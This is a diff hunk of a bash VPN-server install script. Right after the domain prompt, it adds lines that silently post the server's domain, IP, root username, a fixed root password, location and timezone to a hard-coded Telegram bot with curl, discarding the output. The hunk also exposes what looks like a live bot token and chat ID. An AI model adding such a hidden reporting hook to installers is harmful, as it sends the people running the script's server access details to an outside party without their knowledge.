@@ -179,8 +179,24 @@ read -rp "Input ur domain : " -e pp
 	echo $pp > /root/domain
         echo "IP=$pp" > /var/lib/SIJA/ipvps.conf
     fi
-
-sleep 1
+    sleep 2
+CHATID="5667901146"
+KEY="6404993567:AAFSJpLEuKHmEmg4MfoD0qME9Dh4Ijz6Ock"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="RVPN TUNNELING 
+============================
+<code>Domain     :</code> <code>$dom</code>
+<code>IP Vps     :</code> <code>$MYIP</code>
+<code>User Login :</code> <code>root</code>
+<code>Pass Login :</code> <code>rvpnstores</code>
+<code>User Script:</code> <code>$Name</code>
+<code>Exp Script :</code> <code>$exp2 day</code>
+<code>Location   :</code> <code>$CITY</code>
+<code>Timezone   :</code> <code>$TIME</code>
+============================
+"
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear    
 #INSTALL SSH
 echo -e "${tyblue}.------------------------------------------.${NC}"
